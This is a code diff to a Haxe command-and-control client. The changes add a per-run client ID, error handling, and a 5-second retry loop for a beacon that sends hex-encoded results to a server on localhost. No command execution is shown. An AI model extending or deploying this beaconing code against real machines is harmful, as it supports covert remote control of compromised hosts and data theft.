@@ -6,9 +6,11 @@ using haxe.io.Bytes;
 using haxe.Http;
 
 class C2Client {
-    static var return_values:Array<String> = ["hello world!"];
+    static var return_values:Array<String> = [];
+    static var code:String = "client";
 
     static function main() {
+        code += "-" + (Sys.time() % 1000);
         C2Client.doCallback();
     }
 
@@ -16,10 +18,16 @@ class C2Client {
         var ret_list = return_values.map(s -> Bytes.ofString(s).toHex());
         var ret = ret_list.join(',');
         return_values = [];
-        var res = Http.requestUrl('http://localhost:8000/asdf?code=1234&ret=${ret}');
-        Sys.println("res:" + res);
-        C2Client.onResponse(res);
-        // tink.http.Client.fetch('http://localhost:8000/asdf?code=1234&ret=${ret}').all()
+
+        try {
+            var res = Http.requestUrl('http://localhost:8000/asdf?code=${code}&ret=${ret}');
+            Sys.println("res:" + res);
+            C2Client.onResponse(res);
+        } catch(e) {
+            trace(e.message);
+            C2Client.onFailed();
+        }
+        // tink.http.Client.fetch('http://localhost:8000/asdf?code=${code}&ret=${ret}').all()
         //   .handle(function(o) switch o {
         //     case Success(res):
         //       C2Client.onResponse(res);
@@ -53,10 +61,10 @@ class C2Client {
         timer.run = function () { C2Client.doCallback(); timer.stop(); };
     }
 
-    // static function onFailed() {
-    //     var timer = new haxe.Timer(5000);
-    //     timer.run = function () { C2Client.doCallback(); timer.stop(); };
-    // }
+    static function onFailed() {
+        var timer = new haxe.Timer(5000);
+        timer.run = function () { C2Client.doCallback(); timer.stop(); };
+    }
 }
 
 
